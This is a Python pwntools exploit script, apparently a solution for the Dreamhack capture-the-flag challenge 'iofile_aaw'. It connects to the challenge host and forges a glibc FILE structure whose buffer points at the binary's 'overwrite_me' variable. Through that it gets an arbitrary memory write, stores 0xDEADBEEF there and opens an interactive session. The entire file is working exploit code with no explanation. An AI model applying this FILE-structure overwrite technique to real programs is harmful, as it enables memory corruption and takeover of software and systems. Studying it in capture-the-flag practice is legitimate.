#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./iofile_aaw_patched', checksec=False)

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

gs = """
b *main
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 18262)
    else:
        return process(elf.path)
ow_me = elf.sym['overwrite_me']
io = start()
fs = FileStructure()
fs.flags = 0xfbad2488
fs._IO_buf_base = ow_me   
fs._IO_buf_end = ow_me+1024    
fs.fileno = 0x0

sla(b'Data: ',bytes(fs)[:0x78])

sl(pack(0xDEADBEEF) + b"A"*1024)

io.interactive()